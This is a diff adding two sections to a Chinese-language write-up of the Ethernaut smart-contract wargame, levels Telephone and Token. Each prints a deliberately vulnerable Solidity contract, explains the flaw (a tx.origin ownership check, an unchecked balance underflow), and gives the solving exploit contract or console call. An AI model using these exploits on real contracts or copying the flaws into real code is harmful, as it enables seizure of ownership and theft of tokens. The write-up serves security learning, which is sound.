@@ -324,3 +324,108 @@ contract hack {
 ### 参考资料
 
 [Deploy & Run — Remix - Ethereum IDE 1 documentation](https://remix-ide.readthedocs.io/en/latest/run.html)
+
+## 4. Telephone
+
+声明合约的所有权
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    // tx.origin - 交易的发起者
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+```
+
+- 用户通过合约 A 调用合约 B
+    - 对于合约 A：`tx.origin` 和 `msg.sender` 都是用户
+    - 对于合约 B：`tx.origin` 是用户，`msg.sender` 是合约 A
+- 当交易发起者的地址与当前调用者的地址不相同时，可以更新合约所有者，显然需要通过另一个合约来调用 `changeOwner`
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+
+contract Hack {
+
+  address public owner;
+  Telephone tele;
+
+  constructor(address instance) public {
+    owner = msg.sender;
+    tele = Telephone(instance);
+  }
+
+  function exploit() public {
+    tele.changeOwner(owner);
+  }
+}
+```
+
+## 5. Token
+
+增加手中 token 的数量，越多越好（初始 20 个）
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+
+  // 无符号整数类型
+  mapping(address => uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    // 会发生整数溢出，未使用 SafeMath 检查
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+```
+
+通过下溢出来获得 token
+
+```js
+// 转给除自己外的任意地址
+// 转给自己的话，就先下溢出再上溢出了...
+>> await contract.transfer(<address>, 21)
+```
